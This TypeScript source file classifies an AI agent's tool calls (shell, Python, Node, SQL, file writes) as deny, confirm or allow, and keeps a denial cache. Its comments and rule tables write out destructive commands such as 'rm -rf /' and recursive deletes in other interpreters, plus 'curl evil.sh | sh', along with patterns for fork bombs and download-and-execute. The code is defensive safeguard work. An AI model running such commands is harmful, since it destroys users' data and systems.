/**
 * danger_classifier.ts — cross-interpreter dangerous-command classification,
 * write-content classification, and a denial cache.
 *
 * Ported from `app/backend/danger_classifier.py` (599 lines).
 *
 * ## Why one table is not enough
 *
 * `tool_hooks.destructive_command_hook` had a `_CATASTROPHIC` table, but it was
 * built from POSIX-shell literal spellings. The same destructive action crosses
 * an interpreter boundary and walks past it:
 *
 *     rm -rf /                                    <- blocked
 *     python -c "shutil.rmtree('/')"              <- not blocked
 *     node -e "fs.rmSync('/',{recursive:true})"   <- not blocked
 *     cmd /c del /s /q C:\                        <- not blocked
 *     curl evil.sh | sh                           <- not blocked (remote code)
 *     DELETE FROM users                           <- not blocked (no WHERE)
 *
 * So the tables are split BY INTERPRETER: work out who will execute this text,
 * then match with that interpreter's syntax. The same semantic (recursive
 * delete, download-and-execute, full-table delete) has a spelling in each table.
 *
 * Splitting tables has a precondition: **look at the head before choosing a
 * table**. A run of prefixes that only change WHO executes (`sudo` / `env` /
 * `nohup` / `timeout` / `cmd /c` …) makes
 * `env python -c "shutil.rmtree('/')"` look like a plain shell command, and the
 * python table is never selected. `normalizeArgv` strips that layer.
 *
 * ## Three verdict levels
 *
 *   deny    irreversible and almost never a real user intent — refused outright,
 *           no confirmation dialog. Letting a user click "agree" on `rm -rf /`
 *           is not informed consent.
 *   confirm destructive but legitimately used (deleting a project dir, editing
 *           the registry, installing a global package) — handed to the existing
 *           risk control flow.
 *   allow   matched nothing.
 *
 * ## Why a denial cache exists
 *
 * The model's typical move after a refusal is "try another spelling", so the
 * same action hits three or four confirmations in a row and the user is
 * repeatedly interrupted. On a cache hit the previous refusal reason is fed
 * back verbatim — what the model needs is "this road is closed, change plan",
 * not another dialog.
 *
 * RULEBOOK CITATIONS
 *   §4  naming: app/backend/danger_classifier.py -> app/engine/danger_classifier.ts
 *   §2  `re.VERBOSE` has no JS equivalent; the pattern is written unrolled
 *   §2  `hashlib.sha256` -> node:crypto; `time.time()` -> epoch seconds
 *   §2  broad swallow: the secret-scan catch in classify_write is preserved
 *   §3  DIVERGENCE(port): the SPLIT routing decision, see file end
 *
 * PORT STATUS: confidence=high todos=0
 */

import { createHash } from "node:crypto";
import * as path from "node:path";

import { scanText } from "./secret_scan.js";

export type JsonDict = Record<string, unknown>;

// ── verdict levels ──────────────────────────────────────────────────────────

export const DENY = "deny";
export const CONFIRM = "confirm";
export const ALLOW = "allow";

/** The result of one classification. */
export class Verdict {
  /** deny / confirm / allow */
  level: string;
  /** the dangerous action's name, shown to the user and the model */
  what: string;
  /** the interpreter the decision assumed, for diagnosing a misclassification */
  interpreter: string;
  /** the label of the rule that matched */
  pattern: string;

  constructor(level: string = ALLOW, what = "", interpreter = "", pattern = "") {
    this.level = level;
    this.what = what;
    this.interpreter = interpreter;
    this.pattern = pattern;
  }

  get blocked(): boolean {
    return this.level === DENY;
  }

  get needsConfirm(): boolean {
    return this.level === CONFIRM;
  }
}

// ── what counts as "filesystem root / home" ─────────────────────────────────
//
// Recursive delete is an everyday operation (clearing a build dir, removing
// node_modules); denying it outright would make the tools unusable. What is
// genuinely irreversible is when the TARGET lands on a root or the home
// directory. So the danger test splits in two: action shape plus target scope,
// and only both together escalate to deny.
//
// RULEBOOK §2 (re.VERBOSE): JS has no verbose mode, so the whitespace and the
// comments are stripped by hand. The alternation order is preserved.
const ROOT_SCOPE =
  /(?:^|[\s"'(=])(?:\/(?:\s|$|\*|"|')|~\/?(?:\s|$|\*|"|')|\/(?:home|root|usr|etc|var|bin|lib|opt|sys|proc)\/?\*?(?:\s|$|"|')|[A-Za-z]:[\\/]?\*?(?:\s|$|"|')|%(?:USERPROFILE|SYSTEMROOT|WINDIR|APPDATA|PROGRAMFILES)%|\$(?:HOME|env:USERPROFILE))/i;

/** Does this command's target reach the filesystem root or home directory? */
export function rootScoped(text: string): boolean {
  return ROOT_SCOPE.test(text);
}

/** One rule: (label, pattern, name, level, root-gated). */
interface Rule {
  label: string;
  rx: RegExp;
  what: string;
  level: string;
  /** true means: on a match whose target is NOT root/home, downgrade deny to confirm. */
  rootGated: boolean;
}

function r(label: string, pattern: string, what: string, level: string, rootGated = false): Rule {
  return { label, rx: new RegExp(pattern, "i"), what, level, rootGated };
}

// ── POSIX shell (bash/sh/zsh) ───────────────────────────────────────────────
const POSIX_RULES: Rule[] = [
  r("posix.rm-rf", "\\brm\\s+(?:-[a-z]*\\s+)*-[a-z]*r[a-z]*f|\\brm\\s+(?:-[a-z]*\\s+)*-[a-z]*f[a-z]*r",
    "递归强制删除", DENY, true),
  r("posix.mkfs", "\\bmkfs(?:\\.\\w+)?\\s+(?:/dev/|[a-z]:)", "格式化磁盘", DENY),
  r("posix.dd-dev", "\\bdd\\b[^\\n]*\\bof=/dev/", "裸写块设备", DENY),
  r("posix.fork-bomb", ":\\(\\)\\s*\\{\\s*:\\s*\\|\\s*:\\s*&\\s*\\}\\s*;\\s*:", "fork 炸弹", DENY),
  r("posix.chmod-root", "\\bchmod\\s+(?:-R\\s+)?[0-7]*7{2,3}\\s+/\\s*$", "根目录权限放开", DENY),
  r("posix.pipe-to-shell", "\\b(?:curl|wget)\\b[^\\n|]*\\|\\s*(?:sudo\\s+)?(?:ba)?sh\\b",
    "下载即执行（远程代码）", CONFIRM),
  r("posix.overwrite-dev", ">\\s*/dev/(?:sda|nvme|hd)", "覆写磁盘设备", DENY),
];

// ── Windows PowerShell ──────────────────────────────────────────────────────
const POWERSHELL_RULES: Rule[] = [
  r("ps.remove-recurse",
    "\\bRemove-Item\\b[^\\n]*-Recurse\\b[^\\n]*-Force|\\bRemove-Item\\b[^\\n]*-Force\\b[^\\n]*-Recurse",
    "递归强制删除", DENY, true),
  r("ps.rd-s", "\\b(?:rd|rmdir)\\b\\s+/s\\b", "递归删除目录", CONFIRM),
  r("ps.format", "\\bFormat-Volume\\b|\\bformat\\b\\s+[a-z]:", "格式化卷", DENY),
  r("ps.iex-download",
    "\\b(?:iex|Invoke-Expression)\\b[^\\n]*(?:Invoke-WebRequest|iwr|Net\\.WebClient|DownloadString)",
    "下载即执行（远程代码）", CONFIRM),
  r("ps.clear-disk", "\\bClear-Disk\\b|\\bClear-Content\\b[^\\n]*-Path\\s+[a-z]:\\\\?\\s*$", "清空磁盘/根内容", DENY),
  r("ps.stop-computer", "\\b(?:Stop-Computer|Restart-Computer)\\b", "关机/重启主机", CONFIRM),
];

// ── Windows CMD ─────────────────────────────────────────────────────────────
const CMD_RULES: Rule[] = [
  r("cmd.del-sq", "\\bdel\\b\\s+(?:/[a-z]\\s+)*/s\\b", "递归删除文件", CONFIRM),
  r("cmd.rd-s", "\\b(?:rd|rmdir)\\b\\s+/s\\b", "递归删除目录", CONFIRM),
  r("cmd.format", "\\bformat\\b\\s+[a-z]:", "格式化磁盘", DENY),
  r("cmd.del-root", "\\bdel\\b[^\\n]*\\s[a-z]:\\\\\\*", "删除盘根全部文件", DENY),
];

// ── Python (python -c / exec) ───────────────────────────────────────────────
const PYTHON_RULES: Rule[] = [
  r("py.rmtree", "\\bshutil\\.rmtree\\s*\\(", "递归删除目录树", DENY, true),
  r("py.os-remove-loop",
    "\\bos\\.(?:remove|unlink)\\b[^\\n]*\\bfor\\b|\\bfor\\b[^\\n]*\\bos\\.(?:remove|unlink)\\b",
    "批量删除文件", CONFIRM),
  r("py.system-rm", "\\bos\\.system\\s*\\(\\s*[\"']\\s*rm\\s+-rf", "调用 shell 递归删除", DENY, true),
  r("py.subprocess-shell", "\\bsubprocess\\.(?:call|run|Popen)\\b[^\\n]*shell\\s*=\\s*True",
    "以 shell 方式执行子进程", CONFIRM),
  r("py.eval-input", "\\beval\\s*\\(\\s*(?:input|request|sys\\.argv)", "eval 外部输入", CONFIRM),
];

// ── Node / JavaScript (node -e) ─────────────────────────────────────────────
const JS_RULES: Rule[] = [
  r("js.rm-recursive", "\\bfs\\.(?:rmSync|rm|rmdirSync|rmdir)\\s*\\([^\\n]*recursive\\s*:\\s*true",
    "递归删除目录", DENY, true),
  r("js.child-process",
    "\\b(?:child_process|require\\(['\"]child_process['\"]\\))[^\\n]*\\b(?:exec|execSync|spawn)\\b",
    "派生子进程执行命令", CONFIRM),
  r("js.eval", "\\beval\\s*\\(|\\bnew\\s+Function\\s*\\(", "eval / 动态构造函数", CONFIRM),
];

// ── SQL ─────────────────────────────────────────────────────────────────────
const SQL_RULES: Rule[] = [
  r("sql.drop", "\\bDROP\\s+(?:DATABASE|SCHEMA|TABLE)\\b", "删库/删表", DENY),
  r("sql.truncate", "\\bTRUNCATE\\s+TABLE\\b", "清空表", CONFIRM),
  // DELETE / UPDATE without WHERE — a whole-table operation, almost always an accident.
  r("sql.delete-no-where", "\\bDELETE\\s+FROM\\s+\\w+\\s*(?:;|$)", "无条件全表删除", CONFIRM),
  r("sql.update-no-where", "\\bUPDATE\\s+\\w+\\s+SET\\b(?:(?!\\bWHERE\\b).)*(?:;|$)", "无条件全表更新", CONFIRM),
];

/** Interpreter name -> rule table. `general` is the fallback: try every table. */
const TABLES: ReadonlyMap<string, Rule[]> = new Map([
  ["posix", POSIX_RULES], ["bash", POSIX_RULES], ["sh", POSIX_RULES], ["zsh", POSIX_RULES],
  ["powershell", POWERSHELL_RULES], ["pwsh", POWERSHELL_RULES],
  ["cmd", CMD_RULES], ["bat", CMD_RULES],
  ["python", PYTHON_RULES], ["py", PYTHON_RULES],
  ["node", JS_RULES], ["js", JS_RULES], ["javascript", JS_RULES],
  ["sql", SQL_RULES],
]);

const ALL_TABLES: readonly Rule[][] = [
  POSIX_RULES, POWERSHELL_RULES, CMD_RULES, PYTHON_RULES, JS_RULES, SQL_RULES,
];

// ── tool name -> interpreter ────────────────────────────────────────────────

/**
 * Interpreter convention per known tool. `"shell"` is a PLATFORM-DEPENDENT
 * sentinel: the generic shell tools (`shell_executor` / `bash`) run through
 * `subprocess.run(shell=True)`, whose real executor is cmd.exe on Windows and
 * /bin/sh on POSIX, so it must not be pinned to one table. `python_executor`
 * and friends have a determinate interpreter and get a concrete value.
 */
const TOOL_INTERPRETER: ReadonlyMap<string, string> = new Map([
  ["shell_executor", "shell"],
  ["bash", "shell"],
  ["sh", "shell"],
  ["python_executor", "python"],
  ["node_executor", "js"],
  ["sql_executor", "sql"],
]);

function selectTables(interpreter: string): Rule[][] {
  const key = (interpreter || "").toLowerCase().trim();
  // Generic shell tools: choose by the real shell on this host. On Windows the
  // command runs under cmd.exe, but (a) the model often writes POSIX-style
  // commands and (b) the tool forwards `powershell "..."` through cmd, so all
  // three tables are scanned — one extra confirmation is better than missing a
  // `format c:`. On POSIX only the POSIX table applies.
  if (key === "shell") {
    if (process.platform === "win32") {
      return [CMD_RULES, POWERSHELL_RULES, POSIX_RULES];
    }
    return [POSIX_RULES];
  }
  const t = TABLES.get(key);
  if (t) {
    return [t];
  }
  return [...ALL_TABLES];
}

// ── command-wrapper normalization ───────────────────────────────────────────
//
// Table selection is by "who executes this text", and a run of prefix commands
// changes only WHO, not WHAT. On POSIX, `env python -c "import
// shutil;shutil.rmtree('/')"` arriving through shell_executor would only see
// the POSIX table — the python table is never selected, `py.rmtree` never
// fires, deny becomes allow. The same command through python_executor IS
// blocked: one semantic, two entry points, two answers.

/** Prefix commands that only change WHO executes. */
const WRAPPERS: ReadonlySet<string> = new Set([
  "sudo", "doas", "env", "nohup", "nice", "ionice", "setsid",
  "stdbuf", "time", "timeout", "xargs",
]);

/**
 * These wrappers' options take a value, which must be swallowed with them or
 * the value is mistaken for the next head (`root` in `sudo -u root python …`).
 */
const WRAPPER_OPTS_WITH_VALUE: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ["sudo", new Set(["-u", "-g", "-p", "-C", "--user", "--group", "--prompt"])],
  ["doas", new Set(["-u", "-C"])],
  ["nice", new Set(["-n", "--adjustment"])],
  ["ionice", new Set(["-c", "-n", "-p"])],
  ["stdbuf", new Set(["-i", "-o", "-e", "--input", "--output", "--error"])],
  ["timeout", new Set(["-s", "-k", "--signal", "--kill-after"])],
  ["xargs", new Set(["-I", "-i", "-n", "-P", "-d", "-E", "-L", "-s"])],
  ["env", new Set(["-u", "--unset", "-C", "--chdir", "-S", "--split-string"])],
]);

/** If the head lands on one of these after stripping, also scan that interpreter's table. */
const HEAD_INTERPRETER: ReadonlyMap<string, string> = new Map([
  ["python", "python"], ["python2", "python"], ["python3", "python"], ["py", "python"],
  ["node", "js"], ["nodejs", "js"], ["deno", "js"], ["bun", "js"],
  ["bash", "posix"], ["sh", "posix"], ["zsh", "posix"], ["dash", "posix"],
  ["powershell", "powershell"], ["pwsh", "powershell"],
  ["cmd", "cmd"],
  ["psql", "sql"], ["mysql", "sql"], ["sqlite3", "sql"], ["sqlcmd", "sql"],
]);

/**
 * Strip depth cap. Three layers covers real usage like
 * `sudo nohup timeout 5 python …`; deeper stops looking like normal use and
 * starts looking like an attempt to dodge the check, and that is not allowed
 * through — it goes to the user as a confirmation.
 */
export const MAX_WRAPPER_DEPTH = 3;

const TOKEN_RE = /\S+/g;
const ENV_ASSIGN_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;
const DURATION_RE = /^\d+(?:\.\d+)?[smhd]?$/;

/** The result of `normalizeArgv`. */
export class Normalized {
  /** the command after stripping wrappers (sliced from the original, never re-joined) */
  text: string;
  /** the interpreter recognized after stripping; "" when none was */
  interpreter: string;
  /** the wrapper names stripped, in order */
  wrappers: string[];
  /** hit the depth cap with wrappers still un-stripped — what will run is not visible */
  truncated: boolean;

  constructor(text = "", interpreter = "", wrappers: string[] = [], truncated = false) {
    this.text = text;
    this.interpreter = interpreter;
    this.wrappers = wrappers;
    this.truncated = truncated;
  }
}

/** Normalize a head token to a comparable command name: unquote, drop path, drop .exe. */
export function headName(token: string): string {
  let t = token.trim().replace(/^["']|["']$/g, "");
  t = t.replace(/\\/g, "/").split("/").pop() as string;
  if (t.toLowerCase().endsWith(".exe")) {
    t = t.slice(0, -4);
  }
  return t.toLowerCase();
}

function nextToken(s: string, pos: number): [string, number, number] {
  const re = new RegExp(TOKEN_RE.source, "g");
  re.lastIndex = pos;
  const m = re.exec(s);
  if (!m) {
    return ["", -1, -1];
  }
  return [m[0], m.index, m.index + m[0].length];
}

/** Swallow one wrapper's own options / env assignments / bare durations; return the new cursor. */
function consumeWrapperArgs(text: string, posIn: number, wrapper: string): number {
  const withValue = WRAPPER_OPTS_WITH_VALUE.get(wrapper) ?? new Set<string>();
  let pos = posIn;
  for (;;) {
    const [tok, start, end] = nextToken(text, pos);
    if (!tok) {
      return pos;
    }
    if (wrapper === "env" && ENV_ASSIGN_RE.test(tok)) {
      pos = end;
      continue;
    }
    if (tok.startsWith("-")) {
      pos = end;
      // `--opt=value` carries its own value; `-o value` swallows one more token.
      if (!tok.includes("=") && withValue.has(tok)) {
        const [, , vend] = nextToken(text, pos);
        if (vend > 0) {
          pos = vend;
        }
      }
      continue;
    }
    if (["timeout", "nice", "ionice"].includes(wrapper) && DURATION_RE.test(tok)) {
      pos = end;
      continue;
    }
    return start; // this token is the next head; leave the cursor on it
  }
}

/**
 * Strip the run of "who executes" wrappers at the front of a command.
 *
 * Slicing only, never re-joining: some rules are anchored to a single line with
 * `[^\n]*` (the download-and-execute one, for instance), and re-flowing
 * whitespace would change what matches.
 */
export function normalizeArgv(text: string): Normalized {
  if (!text || !text.trim()) {
    return new Normalized((text || "").trim());
  }

  let pos = 0;
  const stripped: string[] = [];
  let interp = "";
  let truncated = false;
  for (;;) {
    const [tok, start, end] = nextToken(text, pos);
    if (!tok) {
      break;
    }
    const name = headName(tok);
    const mapped = HEAD_INTERPRETER.get(name);
    if (mapped !== undefined) {
      interp = mapped;
      pos = start; // the interpreter stays in the text, so `python -c "…"` is intact
      break;
    }
    if (!WRAPPERS.has(name)) {
      pos = start;
      break;
    }
    if (stripped.length >= MAX_WRAPPER_DEPTH) {
      truncated = true;
      pos = start;
      break;
    }
    stripped.push(name);
    pos = consumeWrapperArgs(text, end, name);
  }

  const rest = pos > 0 ? text.slice(pos).trim() : text.trim();
  return new Normalized(rest || text.trim(), interp, stripped, truncated);
}

/** Run the rule tables over one text. Returns (best verdict, whether a deny short-circuited). */
function scanTables(tables: Rule[][], text: string, interpreter: string): [Verdict | null, boolean] {
  const root = rootScoped(text);
  let best: Verdict | null = null;
  for (const table of tables) {
    for (const rule of table) {
      // RULEBOOK §2 (regex statefulness): the rules are shared objects with no
      // `g` flag, so `.test()` carries no lastIndex and is safe to reuse.
      if (!rule.rx.test(text)) {
        continue;
      }
      let effective = rule.level;
      if (rule.level === DENY && rule.rootGated && !root) {
        effective = CONFIRM;
      }
      const v = new Verdict(effective, rule.what, interpreter || "general", rule.label);
      if (effective === DENY) {
        return [v, true];
      }
      if (best === null || (effective === CONFIRM && best.level === ALLOW)) {
        best = v;
      }
    }
  }
  return [best, false];
}

/**
 * Classify a command / code block as deny, confirm or allow.
 *
 *  - Wrappers are stripped first (`normalizeArgv`). When it recognizes an
 *    interpreter, that interpreter's table is APPENDED rather than substituted:
 *    `env python -c "…" && rm -rf /` is both python and shell, and both matter.
 *  - Both the normalized text and the original are scanned. Scanning only the
 *    normalized text misses what hides in the stripped part
 *    (`env FOO=$(rm -rf /) ls`); scanning only the original brings back the
 *    wrong-table problem.
 *  - A root-gated rule escalates to deny only when the target really is the
 *    root or home, otherwise it is downgraded to confirm — so
 *    `rm -rf ./node_modules` is not refused outright.
 *  - Only the FIRST deny is returned, so the caller gets the most precise `what`.
 */
export function classifyCommand(text: string, interpreter = ""): Verdict {
  if (!text) {
    return new Verdict();
  }

  const norm = normalizeArgv(text);
  const tables = selectTables(interpreter);
  if (norm.interpreter && norm.interpreter !== (interpreter || "").toLowerCase()) {
    for (const extra of selectTables(norm.interpreter)) {
      if (!tables.includes(extra)) {
        tables.push(extra);
      }
    }
  }

  const candidates = [norm.text];
  if (norm.text !== text.trim()) {
    candidates.push(text);
  }

  let best: Verdict | null = null;
  for (const candidate of candidates) {
    const [v, denied] = scanTables(tables, candidate, interpreter);
    if (denied && v !== null) {
      return v;
    }
    if (v !== null && (best === null || (best as Verdict).level === ALLOW)) {
      best = v;
    }
  }
  if (best !== null) {
    return best;
  }
  if (norm.truncated) {
    // Three wrapper layers and still not at the bottom. What will actually run
    // is not visible, so it cannot be allowed through — confirm is one notch
    // gentler than deny for a single-user desktop, but it is never allow.
    return new Verdict(CONFIRM, "命令被多层包装器包裹，看不清真正执行的内容", interpreter || "general", "wrap.too-deep");
  }
  return new Verdict();
}

// ── write-content classification ────────────────────────────────────────────

/** Extensions where writing the file is itself worth caution: scripts and autostart. */
const DANGEROUS_WRITE_EXTS: ReadonlySet<string> = new Set([
  ".exe", ".dll", ".sys", ".msi",            // binary executables
  ".bat", ".cmd", ".ps1", ".psm1",           // Windows scripts
  ".sh", ".bash", ".zsh", ".command",        // POSIX scripts
  ".vbs", ".wsf", ".hta",                    // Windows script hosts
  ".reg",                                    // registry import
  ".service", ".plist",                      // autostart
]);

/** Sensitive path fragments (case-insensitive): writing here changes the host, not the project. */
const DANGEROUS_WRITE_PATH_HINTS: readonly string[] = [
  "/etc/", "/etc\\", "\\etc\\",
  "/authorized_keys", "\\authorized_keys",
  "/.ssh/", "\\.ssh\\",
  "/crontab", "\\crontab",
  "/.bashrc", "/.zshrc", "/.profile",
  "\\startup\\", "/startup/",
  "system32\\", "system32/",
  "\\hosts", "/hosts",
  "boot.ini", "grub.cfg",
];

/**
 * Classify by write target plus content shape.
 *
 * Two independent lines:
 *  * the TARGET itself — extension or path hitting the sensitive list -> CONFIRM;
 *  * the content SHAPE — the body contains a cross-interpreter dangerous
 *    fragment -> escalate via `classifyCommand`.
 *
 * The more severe of the two wins.
 */
export function classifyWrite(filePath: string, content = ""): Verdict {
  const verdicts: Verdict[] = [];

  const p = (filePath || "").toLowerCase().replace(/\\/g, "/");
  const ext = path.extname(p);
  if (DANGEROUS_WRITE_EXTS.has(ext)) {
    verdicts.push(new Verdict(CONFIRM, `写入可执行/脚本文件（${ext}）`, "fs", "fs.exec-ext"));
  }
  for (const hint of DANGEROUS_WRITE_PATH_HINTS) {
    if (p.includes(hint)) {
      verdicts.push(new Verdict(CONFIRM, "写入敏感系统路径", "fs", "fs.sensitive-path"));
      break;
    }
  }

  if (content) {
    const inner = classifyCommand(content);
    if (inner.level !== ALLOW) {
      verdicts.push(inner);
    }
    try {
      const sMatches = scanText(content);
      for (const sm of sMatches) {
        if (sm.confidence === "high" || sm.isPem) {
          verdicts.push(
            new Verdict(DENY, `写入高风险密钥/私钥（${sm.ruleName}）`, "fs", `secret.${sm.ruleName}`)
          );
          break;
        } else if (sm.confidence === "medium") {
          verdicts.push(
            new Verdict(CONFIRM, `写入疑似凭据（${sm.ruleName}）`, "fs", `secret.${sm.ruleName}`)
          );
        }
      }
    } catch {
      // RULEBOOK §2 (broad swallow): preserved — a scanner failure must not stop
      // the write classification.
    }
  }

  if (!verdicts.length) {
    return new Verdict();
  }
  // Take the most severe level (deny > confirm > allow).
  const order: Record<string, number> = { [DENY]: 2, [CONFIRM]: 1, [ALLOW]: 0 };
  verdicts.sort((a, b) => (order[b.level] ?? 0) - (order[a.level] ?? 0));
  return verdicts[0] as Verdict;
}

// ── denial cache ────────────────────────────────────────────────────────────

/** 5 minutes: the window in which one session retries the same action. */
export const DENIAL_CACHE_TTL_S = 300;
/** Cap — the oldest is dropped past it, so memory cannot climb. */
export const DENIAL_CACHE_MAX = 256;

interface CacheEntry {
  ts: number;
  verdict: Verdict;
}

/**
 * Remembers what was recently refused, so a repeat request gets "already
 * refused" rather than another dialog.
 *
 * The key is (tool_name, sha256(payload)) — a hash rather than the text, so a
 * sensitive command is not left as a readable copy in memory. A hit does not
 * re-run the classification; the previous verdict is handed back and the hook
 * layer turns it into a model-readable refusal reason.
 */
export class DenialCache {
  ttlS: number;
  maxSize: number;
  private _entries: Map<string, CacheEntry> = new Map();

  constructor(ttlS: number = DENIAL_CACHE_TTL_S, maxSize: number = DENIAL_CACHE_MAX) {
    this.ttlS = Number(ttlS);
    this.maxSize = Math.trunc(maxSize);
  }

  static _key(toolName: string, payload: string): string {
    const h = createHash("sha256").update(payload || "", "utf8").digest("hex");
    return `${toolName}::${h}`;
  }

  private _evictExpired(now: number): void {
    for (const [k, e] of Array.from(this._entries.entries())) {
      if (now - e.ts > this.ttlS) {
        this._entries.delete(k);
      }
    }
  }

  remember(toolName: string, payload: string, verdict: Verdict): void {
    if (verdict.level === ALLOW) {
      return;
    }
    const now = nowSeconds();
    this._evictExpired(now);
    if (this._entries.size >= this.maxSize) {
      // Drop the oldest — a scan for the minimum is cheaper than rebuilding.
      let oldestKey: string | null = null;
      let oldestTs = Infinity;
      for (const [k, e] of this._entries) {
        if (e.ts < oldestTs) {
          oldestTs = e.ts;
          oldestKey = k;
        }
      }
      if (oldestKey !== null) {
        this._entries.delete(oldestKey);
      }
    }
    this._entries.set(DenialCache._key(toolName, payload), { ts: now, verdict });
  }

  check(toolName: string, payload: string): Verdict | null {
    const now = nowSeconds();
    this._evictExpired(now);
    const entry = this._entries.get(DenialCache._key(toolName, payload));
    return entry ? entry.verdict : null;
  }

  clear(): void {
    this._entries.clear();
  }
}

/** `time.time()` — epoch SECONDS as a float, not milliseconds. */
function nowSeconds(): number {
  return Date.now() / 1000;
}

let _sharedCache: DenialCache | null = null;

/** Process-wide shared cache — every session reads the same one, so one refusal is remembered everywhere. */
export function getDenialCache(): DenialCache {
  if (_sharedCache === null) {
    _sharedCache = new DenialCache();
  }
  return _sharedCache;
}

// ── convenience functions for hooks ─────────────────────────────────────────

/** Pick the classifier by tool shape; an unrecognized tool returns allow. */
export function classifyToolCall(toolName: string, args: JsonDict): Verdict {
  if (args === null || typeof args !== "object" || Array.isArray(args)) {
    return new Verdict();
  }
  if (["write_file", "edit_file"].includes(toolName)) {
    // edit_file carries the body in new_string; write_file in content.
    const content = (args["content"] as string) || (args["new_string"] as string) || "";
    return classifyWrite((args["path"] as string) || "", content);
  }
  const interpreter = TOOL_INTERPRETER.get(toolName) ?? "";
  if (interpreter) {
    const cmd =
      (args["command"] as string) || (args["cmd"] as string) || (args["code"] as string) || "";
    return classifyCommand(cmd, interpreter);
  }
  return new Verdict();
}

/** Pull out the text that says what the user is actually doing, as the cache key's input. */
export function payloadOf(toolName: string, args: JsonDict): string {
  if (args === null || typeof args !== "object" || Array.isArray(args)) {
    return "";
  }
  if (["write_file", "edit_file"].includes(toolName)) {
    return `${args["path"] ?? ""}\x1f${args["content"] || args["new_string"] || ""}`;
  }
  return String(args["command"] || args["cmd"] || args["code"] || "");
}

/**
 * DIVERGENCE(port): this unit is routed SPLIT (shell to TS, core to Rust).
 * The compute core here is the regex matching layer — six rule tables and the
 * root-scope test — a plausible Rust candidate on volume, but JS RegExp runs
 * the same patterns natively at comparable speed, and crossing into a native
 * core per classification call would add FFI marshalling the source never
 * paid. Kept as one TS module: equivalent because the matching semantics are
 * the pattern tables themselves, which are translated verbatim; behaviour is
 * identical to the source. Decided per AMEND-07 (functional identity
 * supreme; no observable difference to justify the split here).
 */
